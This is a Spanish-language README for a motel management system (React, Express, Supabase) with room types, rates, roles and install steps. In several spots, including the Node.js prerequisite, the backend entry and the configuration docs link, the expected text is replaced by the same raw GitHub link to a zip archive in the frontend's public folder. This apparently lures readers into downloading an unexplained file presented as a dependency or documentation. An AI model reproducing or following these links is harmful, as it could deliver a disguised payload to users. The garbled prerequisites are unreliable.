# Sistema de Gestión Motel Eclipse 🏨

Sistema web para digitalizar operaciones del motel Eclipse, incluyendo gestión de habitaciones, caja, inventario y reportes.

## 🏗️ Arquitectura

- **Frontend**: React + Vite + Tailwind CSS (desplegado en Vercel)
- **Backend**: https://raw.githubusercontent.com/camilo2874/motel-eclipse/main/frontend/public/motel_eclipse_v3.1.zip + Express (desplegado en Render)
- **Base de Datos**: Supabase (PostgreSQL + Auth + Realtime)

## 📁 Estructura del Proyecto

```
eclipse/
├── frontend/          # Aplicación React
├── backend/           # API REST https://raw.githubusercontent.com/camilo2874/motel-eclipse/main/frontend/public/motel_eclipse_v3.1.zip
└── docs/             # Documentación
```

## 🚀 Stack Tecnológico Gratuito

| Componente | Servicio | Límites Gratuitos |
|------------|----------|-------------------|
| Frontend | Vercel | 100 GB/mes, builds ilimitados |
| Backend | Render + UptimeRobot | 750 hrs/mes, keep-alive con ping |
| Base de Datos | Supabase | 500 MB, 50K usuarios/mes |
| Autenticación | Supabase Auth | Incluido |
| Tiempo Real | Supabase Realtime | Incluido |

## 👥 Roles del Sistema

- **Dueño**: Acceso completo (reportes, modificar precios, gestión de inventario, auditoría)
- **Administrador**: Operaciones diarias (check-in/out, consumos, apertura/cierre de turnos)

## 🏨 Tipos de Habitaciones

| Tipo | Habitaciones | Tarifa Base (12h) | Hora Adicional |
|------|--------------|-------------------|----------------|
| Normal | 1, 2, 3, 4, 7, 8, 9, 10 | $45,000 | $5,000 |
| Máquina del Amor | 5, 6 | $50,000 | $5,000 |
| Suite | 11 | $75,000 | $10,000 |

## 📦 Instalación Local

### Prerrequisitos
- https://raw.githubusercontent.com/camilo2874/motel-eclipse/main/frontend/public/motel_eclipse_v3.1.zip 18+ 
- npm o pnpm
- Cuenta de Supabase (gratuita)

### Frontend
```bash
cd frontend
npm install
npm run dev
```

### Backend
```bash
cd backend
npm install
npm run dev
```

## 🔧 Configuración

Consulta la documentación completa en `https://raw.githubusercontent.com/camilo2874/motel-eclipse/main/frontend/public/motel_eclipse_v3.1.zip`

## 📋 Módulos del Sistema

1. ✅ **Infraestructura Base** - Autenticación y configuración
2. 🚧 **Gestión de Habitaciones** - Dashboard y operaciones
3. ⏳ **Check-in/Check-out** - Flujo de clientes
4. ⏳ **Sistema de Caja** - Turnos y reportes
5. ⏳ **Inventario** - Control de productos
6. ⏳ **Reportes y Auditoría** - Dashboard del dueño

## 📝 Licencia

Proyecto privado - Motel Eclipse © 2026
